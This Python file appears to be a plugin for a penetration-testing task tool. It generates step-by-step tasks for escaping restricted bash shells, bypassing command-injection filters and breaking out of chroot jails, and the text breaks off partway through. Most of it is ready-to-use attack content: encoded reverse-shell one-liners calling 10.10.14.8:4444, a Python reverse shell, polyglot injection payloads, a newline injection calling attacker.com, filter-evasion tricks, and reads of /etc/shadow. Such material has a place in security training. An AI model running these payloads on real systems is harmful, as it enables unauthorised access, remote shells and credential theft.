"""
Linux Shell Escaping and Restricted Shell Bypass Plugin

Generates tasks for escaping restricted shells, bypassing bash jails, and
defeating filesystem protections including:
- Restricted bash (rbash) escape techniques
- Command injection filter bypasses
- Chroot jail escapes
- Read-only/noexec filesystem bypasses
- Distroless container breakouts
- Python/Lua jail escapes

Extracted from HackTricks:
- linux-hardening/bypass-bash-restrictions/README.md
- linux-hardening/privilege-escalation/escaping-from-limited-bash.md
- linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md
- linux-hardening/bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/ddexec.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxShellEscapingPlugin(ServicePlugin):
    """Linux shell escaping and jail breakout techniques"""

    @property
    def name(self) -> str:
        return "linux-shell-escape"

    @property
    def default_ports(self) -> List[int]:
        # This plugin doesn't detect on ports - it's manually triggered
        return []

    @property
    def service_names(self) -> List[str]:
        return ['shell-escape', 'rbash-escape', 'jail-break', 'restricted-shell']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        This plugin is manually triggered, not auto-detected.
        Activate with: crack track add-plugin linux-shell-escape <target>
        """
        # Manual activation only
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux shell escaping task tree"""

        # Determine context from service_info
        context = service_info.get('context', 'general')  # general, ssh, restricted, chroot, container
        shell_type = service_info.get('shell', 'bash')  # bash, rbash, sh, python, lua
        has_sudo = service_info.get('has_sudo', False)
        has_python = service_info.get('has_python', False)
        has_perl = service_info.get('has_perl', False)
        is_container = service_info.get('is_container', False)
        is_readonly = service_info.get('is_readonly', False)

        tasks = {
            'id': 'linux-shell-escape-root',
            'name': f'Linux Shell Escaping: {target}',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Enumeration and Reconnaissance
        enum_tasks = {
            'id': 'shell-enum',
            'name': 'Shell Environment Enumeration',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Basic environment enumeration
        enum_tasks['children'].append({
            'id': 'enum-environment',
            'name': 'Enumerate Shell Environment',
            'type': 'command',
            'metadata': {
                'command': 'echo $SHELL; echo $PATH; env; export; pwd; id; uname -a',
                'description': 'Gather information about current shell, PATH, environment variables, user context, and system',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                'flag_explanations': {
                    'echo $SHELL': 'Display current shell binary path (e.g., /bin/bash, /bin/rbash)',
                    'echo $PATH': 'Show PATH environment variable - reveals available command locations',
                    'env': 'List all environment variables',
                    'export': 'Show exported variables (alternative to env)',
                    'pwd': 'Print working directory',
                    'id': 'Show user and group IDs',
                    'uname -a': 'Display system information'
                },
                'success_indicators': [
                    'Shell type identified (bash, rbash, sh, zsh, etc.)',
                    'PATH variable shows limited directories',
                    'User context and privileges revealed',
                    'System architecture identified'
                ],
                'failure_indicators': [
                    'Command not found errors (severely restricted shell)',
                    'Permission denied on basic commands',
                    'No output from env/export (variables restricted)'
                ],
                'next_steps': [
                    'Identify restricted commands and forbidden characters',
                    'Check if PATH can be modified',
                    'Test which builtins are available',
                    'Determine if running in container/chroot'
                ],
                'alternatives': [
                    'Use builtin commands only: declare; history; declare functions',
                    'Check shell options: shopt -p (bash) or set -o',
                    'List builtins: declare builtins; enable -a'
                ],
                'notes': 'Critical first step - identifies the jail type and available tools. Document all findings for escape strategy planning.',
                'time_estimate': '30 seconds'
            }
        })

        # Task 1.2: Test command restrictions
        enum_tasks['children'].append({
            'id': 'test-restrictions',
            'name': 'Test Command Restrictions and Filters',
            'type': 'command',
            'metadata': {
                'command': 'cat /etc/passwd; ls /; cd /tmp; echo test; whoami; which python; which perl; which vim',
                'description': 'Test for command filtering, forbidden characters, and available tools',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'cat /etc/passwd': 'Test if cat and path access work',
                    'ls /': 'Test directory listing and slash character',
                    'cd /tmp': 'Test directory changing and writable locations',
                    'echo test': 'Verify echo works (useful for encoding bypasses)',
                    'whoami': 'Test external command execution',
                    'which': 'Locate interpreter binaries for script-based escapes'
                },
                'success_indicators': [
                    'Commands execute without errors',
                    'Can access /tmp or other writable directories',
                    'Scripting languages (python, perl) available',
                    'Can execute external binaries'
                ],
                'failure_indicators': [
                    'Specific commands blocked (command not found)',
                    'Slash character filtered or blocked',
                    'cd command restricted (rbash indicator)',
                    'Cannot execute external commands (PATH restriction)',
                    'Cannot use special characters (pipe, redirect, etc.)'
                ],
                'next_steps': [
                    'If python/perl found: use script-based escape',
                    'If cd restricted: confirm rbash, use BASH_CMDS trick',
                    'If slash blocked: use $HOME variable or wildcard bypasses',
                    'If echo works: test encoding bypasses (hex, base64)'
                ],
                'alternatives': [
                    'Use printf instead of echo: printf "%s\\n" test',
                    'Use builtins: declare -p PATH; declare -p HOME',
                    'Test wildcards: echo /e*/p*wd for /etc/passwd'
                ],
                'notes': 'Systematically test each restriction type. Some filters are case-sensitive or only block certain positions.',
                'time_estimate': '1-2 minutes'
            }
        })

        # Task 1.3: Check filesystem protections
        enum_tasks['children'].append({
            'id': 'check-fs-protections',
            'name': 'Check Filesystem Mount Options and Protections',
            'type': 'command',
            'metadata': {
                'command': 'mount | grep -E "(ro,|noexec,|nosuid)"; cat /proc/mounts | grep -E "(ro,|noexec)"; ls -la /dev/shm; ls -la /tmp',
                'description': 'Identify read-only, noexec, nosuid filesystem protections (common in containers)',
                'tags': ['OSCP:HIGH', 'ENUM', 'CONTAINER'],
                'flag_explanations': {
                    'mount': 'Display all mounted filesystems and their options',
                    'grep -E "(ro,|noexec,|nosuid)"': 'Filter for security mount flags',
                    '/proc/mounts': 'Alternative mount info source (always available)',
                    'ls -la /dev/shm': 'Check shared memory (writable even in ro filesystems)',
                    'ls -la /tmp': 'Check temp directory writability'
                },
                'success_indicators': [
                    'Mount options revealed (ro, noexec, nosuid)',
                    '/dev/shm is writable (even if ro)',
                    '/tmp is writable and executable',
                    'Can identify container environment'
                ],
                'failure_indicators': [
                    'mount command not available',
                    'Permission denied on /proc/mounts',
                    'All filesystems mounted with strict protections'
                ],
                'next_steps': [
                    'If ro+noexec: plan memory execution (DDexec, memfd)',
                    'If /dev/shm writable: use for staging',
                    'If /tmp writable+executable: use for binaries',
                    'Check for memfd_create support (kernel >= 3.17)'
                ],
                'alternatives': [
                    'Read /proc/self/mounts directly: cat /proc/self/mounts',
                    'Test writability: touch /tmp/test; touch /dev/shm/test',
                    'Test execution: echo -e "#!/bin/sh\\necho test" > /tmp/t; chmod +x /tmp/t; /tmp/t'
                ],
                'notes': 'Container environments often use ro+noexec. DDexec/memfd techniques bypass these protections.',
                'time_estimate': '30 seconds'
            }
        })

        # Task 1.4: Identify available builtins
        enum_tasks['children'].append({
            'id': 'enum-builtins',
            'name': 'Enumerate Available Shell Builtins',
            'type': 'command',
            'metadata': {
                'command': 'declare builtins; enable; help',
                'description': 'List bash builtin commands (critical when external commands blocked)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'declare builtins': 'List all builtin commands available',
                    'enable': 'Show enabled/disabled builtins',
                    'help': 'Display help for builtins'
                },
                'success_indicators': [
                    'Full list of builtins displayed',
                    'Key builtins available: read, printf, mapfile, source, eval',
                    'declare/enable commands work'
                ],
                'failure_indicators': [
                    'declare command blocked',
                    'Critical builtins disabled',
                    'help not available'
                ],
                'next_steps': [
                    'If read available: use for reading files and command execution',
                    'If printf available: use for character generation bypasses',
                    'If eval/exec available: use for command execution tricks',
                    'If source available: use for executing files'
                ],
                'alternatives': [
                    'Test individual builtins: read; printf; eval; exec',
                    'Check history: history; declare history; declare historywords',
                    'Use compgen: compgen -b (list builtins); compgen -c (list commands)'
                ],
                'notes': 'Builtins execute without PATH and cannot be filtered by external restrictions. Key for advanced escapes.',
                'time_estimate': '30 seconds'
            }
        })

        tasks['children'].append(enum_tasks)

        # PHASE 2: Basic Escape Techniques
        basic_escape = {
            'id': 'basic-escapes',
            'name': 'Basic Shell Escape Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: PATH modification
        basic_escape['children'].append({
            'id': 'modify-path',
            'name': 'Attempt PATH Variable Modification',
            'type': 'command',
            'metadata': {
                'command': 'PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH; export PATH; bash',
                'description': 'Try to expand PATH to include full system binaries and spawn unrestricted shell',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'PATH=/usr/local/...': 'Set PATH to standard full system paths',
                    'export PATH': 'Make PATH change permanent for child processes',
                    'bash': 'Spawn new bash shell with updated PATH'
                },
                'success_indicators': [
                    'PATH variable updated successfully',
                    'New shell spawned with full command access',
                    'Previously blocked commands now available'
                ],
                'failure_indicators': [
                    'readonly variable PATH error (rbash protection)',
                    'export command blocked',
                    'bash spawn blocked or spawns another restricted shell'
                ],
                'next_steps': [
                    'If successful: verify with ls, cat, etc.',
                    'If failed: try declare PATH= instead of export',
                    'If readonly: use SHELL variable trick',
                    'Try other shell binaries: sh, zsh, ksh'
                ],
                'alternatives': [
                    'Use declare: declare PATH="/bin:/usr/bin"',
                    'Set SHELL: SHELL=/bin/bash; bash',
                    'Direct execution: /bin/bash --norc --noprofile',
                    'Via env: env -i bash -p'
                ],
                'notes': 'First technique to try. Simple but often blocked in rbash. Some shells allow modification before readonly flag set.',
                'time_estimate': '30 seconds'
            }
        })

        # Task 2.2: SSH command execution
        basic_escape['children'].append({
            'id': 'ssh-shell-escape',
            'name': 'SSH Direct Command Execution Escape',
            'type': 'command',
            'metadata': {
                'command': f'ssh user@{target} bash --noprofile -i',
                'description': 'Use SSH -t option to request unrestricted shell before restricted profile loads',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'SSH'],
                'flag_explanations': {
                    '-t': 'Force pseudo-terminal allocation',
                    'bash --noprofile': 'Skip profile/rc files that enable restrictions',
                    '-i': 'Interactive mode',
                    '() { :; };': 'Shellshock payload (if vulnerable bash)'
                },
                'success_indicators': [
                    'Unrestricted bash shell obtained',
                    'Full PATH and commands available',
                    'No rbash restrictions applied'
                ],
                'failure_indicators': [
                    'Still lands in restricted shell',
                    'ForceCommand in sshd_config overrides',
                    'SSH server rejects -t option'
                ],
                'next_steps': [
                    'If successful: privilege escalation enumeration',
                    'If failed: try other command options',
                    'Test shellshock: ssh user@host -t "() { :; }; sh -i"',
                    'Try exec trick: ssh user@host -t "exec /bin/bash"'
                ],
                'alternatives': [
                    'Shellshock bypass: ssh user@target -t "() { :; }; sh -i"',
                    'Direct bash: ssh -t user@target /bin/bash',
                    'Specify shell: ssh -t user@target bash --norc',
                    'Via script: ssh user@target -t "bash --init-file /dev/null"'
                ],
                'notes': 'Only works if you have SSH access. Some servers force commands via ForceCommand directive.',
                'time_estimate': '30 seconds'
            }
        })

        # Task 2.3: Vi/Vim escape
        basic_escape['children'].append({
            'id': 'vim-shell-escape',
            'name': 'Vim/Vi Editor Shell Escape',
            'type': 'command',
            'metadata': {
                'command': 'vim -c ":set shell=/bin/bash" -c ":shell"',
                'description': 'Use vim/vi editor to spawn shell via :shell command',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'GTFOBIN'],
                'flag_explanations': {
                    '-c': 'Execute command after loading',
                    ':set shell=/bin/bash': 'Configure shell binary to use',
                    ':shell': 'Drop to shell from vim'
                },
                'success_indicators': [
                    'Vim opens successfully',
                    'Shell spawned from vim',
                    'Unrestricted bash access'
                ],
                'failure_indicators': [
                    'vim/vi not available',
                    ':shell command disabled',
                    'set shell command blocked'
                ],
                'next_steps': [
                    'If vim blocked: try vi, nano, emacs',
                    'Try command execution: vim -c ":!bash"',
                    'Use read: vim -c ":r /etc/passwd"',
                    'Check GTFOBins for other editors'
                ],
                'alternatives': [
                    'Direct command: vim -c ":!bash"',
                    'From inside vim: :set shell=/bin/bash then :sh',
                    'Read files: vim -c ":r /etc/shadow"',
                    'Vi escape: vi then :!/bin/bash',
                    'Emacs escape: emacs -Q -nw --eval "(call-process "/bin/bash")"'
                ],
                'notes': 'Check GTFOBins for editor-based escapes. Many editors allow shell execution.',
                'time_estimate': '1 minute'
            }
        })

        # Task 2.4: Declare tricks
        basic_escape['children'].append({
            'id': 'declare-path-bypass',
            'name': 'Declare Command PATH Bypass',
            'type': 'command',
            'metadata': {
                'command': 'declare -n PATH; export PATH=/bin:/usr/bin; bash -i',
                'description': 'Use declare nameref to bypass readonly PATH restriction',
                'tags': ['OSCP:MEDIUM', 'ADVANCED', 'MANUAL'],
                'flag_explanations': {
                    'declare -n PATH': 'Create nameref to PATH (bypasses readonly in some versions)',
                    'export PATH=/bin:/usr/bin': 'Set full PATH',
                    'bash -i': 'Interactive bash shell'
                },
                'success_indicators': [
                    'PATH updated despite readonly flag',
                    'New shell spawned with full access',
                    'Commands from /bin /usr/bin now available'
                ],
                'failure_indicators': [
                    'declare: PATH: readonly variable',
                    'Still restricted after bash spawn',
                    'declare command not available'
                ],
                'next_steps': [
                    'Try BASH_CMDS trick: BASH_CMDS[a]=/bin/sh;a',
                    'Use function override if allowed',
                    'Try command hash manipulation',
                    'Fall back to encoding bypasses'
                ],
                'alternatives': [
                    'BASH_CMDS trick: BASH_CMDS[shell]=/bin/bash; shell -i',
                    'Function override: function ls() { /bin/bash; }; ls',
                    'Hash manipulation: hash -p /bin/bash restricted_cmd',
                    'Command builtin: command bash'
                ],
                'notes': 'BASH_CMDS array can execute arbitrary commands. Works in many rbash configurations.',
                'time_estimate': '1 minute'
            }
        })

        tasks['children'].append(basic_escape)

        # PHASE 3: Command Injection Bypass Techniques
        bypass_filters = {
            'id': 'filter-bypasses',
            'name': 'Command Injection Filter Bypasses',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Character encoding bypasses
        bypass_filters['children'].append({
            'id': 'encoding-bypasses',
            'name': 'Hex and Base64 Encoding Bypasses',
            'type': 'command',
            'metadata': {
                'command': 'echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"; $(echo $\'\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\')',
                'description': 'Bypass string filters using hex encoding to obfuscate commands',
                'tags': ['OSCP:HIGH', 'MANUAL', 'BYPASS'],
                'flag_explanations': {
                    'echo -e': 'Enable interpretation of backslash escapes',
                    '\\x2f': 'Hex encoding for slash (/) character',
                    '$\'...\'': 'ANSI-C quoting (bash) - interprets escape sequences',
                    '$(...)': 'Command substitution - executes hex-decoded command'
                },
                'success_indicators': [
                    'Hex-encoded string decoded and executed',
                    'Filtered characters successfully bypassed',
                    'Command output displayed'
                ],
                'failure_indicators': [
                    'echo -e not available or disabled',
                    '$\'...\' syntax not supported',
                    'Command substitution blocked'
                ],
                'next_steps': [
                    'Try base64 encoding: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)',
                    'Use double base64 for + character issues',
                    'Try xxd for hex: cat `xxd -r -p <<< 2f6574632f706173737764`',
                    'Use printf with hex: printf \'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\''
                ],
                'alternatives': [
                    'Base64: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)',
                    'Double base64: echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|base64 -d|base64 -d|bash',
                    'xxd: cat `xxd -r -ps <(echo 2f6574632f706173737764)`',
                    'printf: $(printf \'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\')',
                    'Variable assignment: abc=$\'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\'; cat $abc'
                ],
                'notes': 'Double-base64 avoids + character issues (99% success rate). Use for reverse shells with special chars.',
                'time_estimate': '2 minutes'
            }
        })

        # Task 3.2: Wildcard and globbing bypasses
        bypass_filters['children'].append({
            'id': 'wildcard-bypasses',
            'name': 'Wildcard and Character Substitution Bypasses',
            'type': 'command',
            'metadata': {
                'command': '/usr/bin/p?ng localhost; /usr/bin/who*mi; /usr/bin/n[c] -h',
                'description': 'Use wildcards (?, *, []) to bypass command name filters and blacklists',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '?': 'Single character wildcard (p?ng matches ping)',
                    '*': 'Multi-character wildcard (who*mi matches whoami)',
                    '[c]': 'Character class (n[c] matches nc)'
                },
                'success_indicators': [
                    'Command executed despite name in blacklist',
                    'Wildcard expanded correctly to target command',
                    'Output displays as expected'
                ],
                'failure_indicators': [
                    'Multiple files match wildcard (ambiguous)',
                    'No files match pattern',
                    'Wildcard expansion disabled'
                ],
                'next_steps': [
                    'Test with quotes: \'p\'i\'n\'g (bypass keyword matching)',
                    'Try backslashes: \\u\\n\\a\\m\\e -\\a',
                    'Use $@ null variable: who$@ami',
                    'Test current dir echo: echo * (lists files)'
                ],
                'alternatives': [
                    'Quote bypass: \'p\'i\'n\'g localhost or "w"h"o"a"m"i',
                    'Backslash: \\u\\n\\a\\m\\e -\\a or \\b\\i\\n/////s\\h',
                    'Null variable: who$@ami or cat$u/etc$u/passwd$u',
                    'Brace: {cat,/etc/passwd} expands to cat /etc/passwd',
                    'Directory listing: echo * or echo /e*c/p*s*wd'
                ],
                'notes': 'Wildcards bypass signature-based filters. Combine with quotes for multi-layer obfuscation.',
                'time_estimate': '1-2 minutes'
            }
        })

        # Task 3.3: Space bypass techniques
        bypass_filters['children'].append({
            'id': 'space-bypasses',
            'name': 'Space Character Bypass Techniques',
            'type': 'command',
            'metadata': {
                'command': '{cat,/etc/passwd};cat${IFS}/etc/passwd;X=$\'cat\\x20/etc/passwd\'&&$X',
                'description': 'Bypass space character filters using IFS, brace expansion, tabs, and hex encoding',
                'tags': ['OSCP:HIGH', 'MANUAL', 'BYPASS'],
                'flag_explanations': {
                    '{cat,/etc/passwd}': 'Brace expansion - comma acts as space separator',
                    '${IFS}': 'Internal Field Separator variable (default space/tab/newline)',
                    '$IFS': 'Short form IFS usage',
                    '\\x20': 'Hex encoding for space character',
                    '$\'...\'': 'ANSI-C quoting with escape interpretation'
                },
                'success_indicators': [
                    'Command executed without space character',
                    'Arguments properly separated',
                    'Output displays correctly'
                ],
                'failure_indicators': [
                    'Syntax error from malformed substitution',
                    'IFS variable not accessible',
                    'Brace expansion disabled'
                ],
                'next_steps': [
                    'Try tab character: echo "ls\\x09-l" | bash',
                    'Use history: $u $u creates space via undefined variable',
                    'Test newline: p\\ + newline + i\\ + newline + ng',
                    'Use fake commands: p$(u)i$(u)n$(u)g (errors but works)'
                ],
                'alternatives': [
                    'Tab: echo "ls\\x09-l" | bash',
                    'Undefined variable: cat$u/etc$u/passwd$u',
                    'Brace + IFS: IFS=];b=cat]/etc/passwd;$b',
                    'History: !-1 (last command) trick for concatenation',
                    'Newline: p\\ [newline] i\\ [newline] ng equals ping'
                ],
                'notes': 'IFS is the most reliable method. Can chain commands: IFS=];b=wget]10.10.14.21]-P]/tmp;$b',
                'time_estimate': '2 minutes'
            }
        })

        # Task 3.4: Slash and path bypasses
        bypass_filters['children'].append({
            'id': 'slash-bypasses',
            'name': 'Slash Character and Path Bypass Techniques',
            'type': 'command',
            'metadata': {
                'command': 'cat ${HOME:0:1}etc${HOME:0:1}passwd; cat $(echo . | tr \'!-0\' \'"-1\')etc$(echo . | tr \'!-0\' \'"-1\')passwd',
                'description': 'Bypass slash (/) character filters using variable substitution and character translation',
                'tags': ['OSCP:MEDIUM', 'ADVANCED', 'BYPASS'],
                'flag_explanations': {
                    '${HOME:0:1}': 'Substring extraction from HOME variable (gets first char "/")',
                    ':0:1': 'Start at position 0, length 1',
                    'tr \'!-0\' \'"-1\'': 'Translate characters (shifts . to /)',
                    'echo .': 'Input for tr command'
                },
                'success_indicators': [
                    'Slash character successfully generated without typing it',
                    'Path access works despite filter',
                    'File contents displayed'
                ],
                'failure_indicators': [
                    'Variable substitution syntax error',
                    'tr command not available',
                    'HOME variable not set or empty'
                ],
                'next_steps': [
                    'Try PWD variable: printf %.1s "$PWD" (gets /)',
                    'Use echo with path: echo /h* (expands to /home)',
                    'Test env vars for slashes: echo $PATH | cut -c1',
                    'Use printf: $(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls'
                ],
                'alternatives': [
                    'PWD method: $(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls',
                    'PATH extraction: echo ${PATH:0:1} (gets /)',
                    'Wildcard: echo /e*c/p*wd (expands to /etc/passwd)',
                    'Other env vars: ${LS_COLORS:10:1} might contain /',
                    'Hard-code alternative: cat ~/../etc/passwd (~ expands to /home/user)'
                ],
                'notes': 'Useful when / is explicitly filtered but wildcards are not. Combine with other techniques.',
                'time_estimate': '2-3 minutes'
            }
        })

        # Task 3.5: Pipe and redirect bypasses
        bypass_filters['children'].append({
            'id': 'pipe-bypasses',
            'name': 'Pipe and Redirect Character Bypasses',
            'type': 'command',
            'metadata': {
                'command': 'bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)',
                'description': 'Bypass pipe (|) and redirect (<, >) filters using here-strings and command substitution',
                'tags': ['OSCP:MEDIUM', 'BYPASS'],
                'flag_explanations': {
                    '<<<': 'Here-string operator (feeds string to stdin)',
                    'bash<<<...': 'Execute string as bash commands',
                    'base64 -d': 'Decode base64 string',
                    '<<<Y2F0...': 'Base64 encoded command with pipe'
                },
                'success_indicators': [
                    'Base64 payload decoded and executed',
                    'Pipe command inside payload works',
                    'Output filtered as expected'
                ],
                'failure_indicators': [
                    'base64 command not available',
                    'Here-string syntax not supported',
                    'Still cannot use pipes in decoded command'
                ],
                'next_steps': [
                    'Encode full command chains with base64',
                    'Use process substitution if available: <(...) or >(...)',
                    'Try command substitution: $(cmd1) as input to cmd2',
                    'Test variable assignment chains'
                ],
                'alternatives': [
                    'Process substitution: diff <(cmd1) <(cmd2)',
                    'Command substitution: cmd2 $(cmd1)',
                    'Variable chain: a=$(cmd1); cmd2 $a',
                    'Hex encoding: bash<<<$(echo -e "\\x63\\x61\\x74\\x20\\x7c\\x20\\x67\\x72\\x65\\x70")',
                    'File write then execute: echo cmd1>f; echo cmd2>>f; bash f'
                ],
                'notes': 'Here-strings (<<<) are less commonly filtered than pipes. Base64 encoding hides command structure.',
                'time_estimate': '2 minutes'
            }
        })

        # Task 3.6: Reverse shell encoding
        bypass_filters['children'].append({
            'id': 'encoded-reverse-shell',
            'name': 'Encoded Reverse Shell Payloads',
            'type': 'command',
            'metadata': {
                'command': 'echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|base64 -d|base64 -d|bash',
                'description': 'Double-base64 encoded reverse shell to bypass special character filters (99% success rate)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'REVERSE_SHELL'],
                'flag_explanations': {
                    'WW1GemFD...': 'Double base64 encoded: bash -i >& /dev/tcp/10.10.14.8/4444 0>&1',
                    'base64 -d': 'Decode base64 (first layer)',
                    '| base64 -d': 'Decode again (second layer)',
                    '| bash': 'Execute decoded reverse shell command'
                },
                'success_indicators': [
                    'Reverse shell connection established',
                    'Interactive shell obtained on attacker machine',
                    'No special characters triggered filters'
                ],
                'failure_indicators': [
                    'base64 command not available',
                    'Outbound connection blocked by firewall',
                    'bash not available for execution',
                    '/dev/tcp not supported (compile bash without it)'
                ],
                'next_steps': [
                    'Generate payload: echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | base64 | base64',
                    'Replace spaces with ${IFS}: echo${IFS}...|base64...',
                    'Try nc reverse shell if /dev/tcp unavailable',
                    'Use python/perl/ruby reverse shell as alternative'
                ],
                'alternatives': [
                    'Single base64: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==|base64 -d|bash',
                    'Hex: echo -e "\\x62\\x61\\x73\\x68..." (full hex encoding)',
                    'IFS: echo${IFS}YmFzaC...=|ba\'\'se\'\'64${IFS}-d|bash',
                    'Short shell: (sh)0>/dev/tcp/10.10.10.10/443 then exec >&0',
                    'Python: python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
                ],
                'notes': 'Double-base64 avoids + character issues that break single encoding. Generate: echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" | base64 | base64',
                'time_estimate': '2 minutes'
            }
        })

        # Task 3.7: Polyglot injection
        bypass_filters['children'].append({
            'id': 'polyglot-injection',
            'name': 'Polyglot Command Injection Payload',
            'type': 'command',
            'metadata': {
                'command': '1;sleep${IFS}9;#${IFS}\';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}',
                'description': 'Universal command injection payload that works in multiple contexts (unquoted, single-quoted, double-quoted)',
                'tags': ['OSCP:MEDIUM', 'INJECTION', 'POLYGLOT'],
                'flag_explanations': {
                    '1;': 'Harmless first command (terminates cleanly)',
                    'sleep${IFS}9': 'Test command with IFS space bypass',
                    ';': 'Command separator',
                    '#': 'Comment character',
                    '\'': 'Single quote (breaks out of single-quote context)',
                    '"': 'Double quote (breaks out of double-quote context)'
                },
                'success_indicators': [
                    '9 second delay observed (sleep command executed)',
                    'Works regardless of quote context',
                    'No syntax errors generated'
                ],
                'failure_indicators': [
                    'No delay (command not executed)',
                    'Syntax error displayed',
                    'Semicolon or comment filtered'
                ],
                'next_steps': [
                    'Replace sleep with actual payload once confirmed',
                    'Test alternative separators: & && || |',
                    'Try newline as separator: %0a or \\n',
                    'Use in command injection vulnerabilities'
                ],
                'alternatives': [
                    'Alternative polyglot: /*$(sleep 5)`sleep 5``*/-sleep(5)-\'/*$(sleep 5)`sleep 5` #*/-sleep(5)||\'"||sleep(5)||"/*`*/',
                    'Newline injection: 1%0a`curl http://attacker.com`',
                    'Backtick context: `id`',
                    'Arithmetic context: $(($(id)0))',
                    'Time-based test: time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi'
                ],
                'notes': 'Test with sleep first to confirm injection. Then replace with actual payload. Polyglot works in most contexts.',
                'time_estimate': '2 minutes'
            }
        })

        tasks['children'].append(bypass_filters)

        # PHASE 4: Chroot Jail Escapes
        if context in ['general', 'chroot'] or has_sudo:
            chroot_escape = {
                'id': 'chroot-escapes',
                'name': 'Chroot Jail Escape Techniques',
                'type': 'parent',
                'children': []
            }

            # Task 4.1: Check if in chroot
            chroot_escape['children'].append({
                'id': 'detect-chroot',
                'name': 'Detect Chroot Environment',
                'type': 'command',
                'metadata': {
                    'command': 'ls -id / ; ls -id /proc/1/root/.; mount | grep -E "chroot|jail"; cat /proc/1/mountinfo',
                    'description': 'Detect if running inside chroot jail by comparing root directory inodes',
                    'tags': ['OSCP:HIGH', 'ENUM', 'CHROOT'],
                    'flag_explanations': {
                        'ls -id /': 'Get inode number of current root directory',
                        'ls -id /proc/1/root/.': 'Get inode of init process root directory',
                        '-id': 'Display inode number and directory',
                        'mount | grep chroot': 'Check for chroot in mount info',
                        '/proc/1/mountinfo': 'View init process mount namespace'
                    },
                    'success_indicators': [
                        'Different inode numbers (inside chroot)',
                        'Cannot access /proc/1/root (permission denied)',
                        'Mount points look restricted or minimal',
                        'chroot mentioned in mount info'
                    ],
                    'failure_indicators': [
                        'Same inode numbers (not in chroot)',
                        'Full /proc access (not restricted)',
                        'Standard system mount points visible'
                    ],
                    'next_steps': [
                        'If in chroot + root: use double chroot escape',
                        'If unprivileged: escalate to root first',
                        'Check for accessible file descriptors: ls -la /proc/$$/fd',
                        'Look for mount capability or ptrace access'
                    ],
                    'alternatives': [
                        'Compare: stat -c %d:%i / vs stat -c %d:%i /proc/1/root/.',
                        'Check filesystem: df -h (limited output in chroot)',
                        'Process check: ps aux (fewer processes visible in chroot)',
                        'Test access: cat /proc/1/environ (fails if chrooted)'
                    ],
                    'notes': 'Chroot is not a security boundary - designed for isolation, not containment. Root can always escape.',
                    'time_estimate': '30 seconds'
                }
            })

            # Task 4.2: Root + CWD double chroot
            chroot_escape['children'].append({
                'id': 'double-chroot-escape',
                'name': 'Double Chroot Escape (Root Required)',
                'type': 'manual',
                'metadata': {
                    'description': 'Escape chroot by creating nested chroot and changing directory outside of it',
                    'tags': ['OSCP:HIGH', 'ADVANCED', 'CHROOT', 'ROOT_REQUIRED'],
                    'steps': [
                        '1. Compile escape binary on attacker machine:',
                        '   gcc -o break_chroot break_chroot.c',
                        '   # C code: mkdir("chroot-dir", 0755); chroot("chroot-dir");',
                        '   #         for(i=0; i<1000; i++) chdir("..");',
                        '   #         chroot("."); system("/bin/bash");',
                        '2. Transfer to target: wget http://ATTACKER/break_chroot',
                        '3. Make executable: chmod +x break_chroot',
                        '4. Execute: ./break_chroot',
                        '5. Verify escape: ls / (should see full filesystem)'
                    ],
                    'flag_explanations': {
                        'mkdir': 'Create new directory for nested chroot',
                        'chroot("chroot-dir")': 'Create new chroot inside current one',
                        'chdir("..")': 'Move up directory tree (outside new chroot)',
                        'chroot(".")': 'Chroot to current dir (outside original chroot)',
                        'system("/bin/bash")': 'Spawn shell in real filesystem'
                    },
                    'success_indicators': [
                        'New bash shell spawned',
                        'Full filesystem access restored',
                        'Can see all system directories',
                        'No more chroot restrictions'
                    ],
                    'failure_indicators': [
                        'Permission denied (not root)',
